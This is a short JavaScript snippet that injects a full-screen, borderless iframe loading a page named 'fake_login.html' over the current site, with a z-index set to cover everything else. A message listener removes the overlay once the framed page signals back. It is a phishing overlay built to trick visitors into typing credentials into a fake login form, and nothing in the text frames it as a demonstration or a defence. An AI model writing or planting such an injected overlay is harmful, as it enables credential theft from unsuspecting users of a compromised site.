const iframe = document.createElement('iframe');
iframe.setAttribute('src', 'fake_login.html');
iframe.setAttribute('width', '100%');
iframe.setAttribute('height', '100%');
iframe.setAttribute('frameBorder', '0');
iframe.setAttribute('style', 'position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;');
document.body.appendChild(iframe);
console.log('iframe.contentWindow =', iframe.contentWindow);
window.addEventListener('message', received, false);
function received(event) {
    iframe.setAttribute('style', 'position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:0%; height:0%; border:none; margin:0; padding:0; overflow:hidden; z-index:-100;');
    iframe.parentNode.removeChild(iframe);
}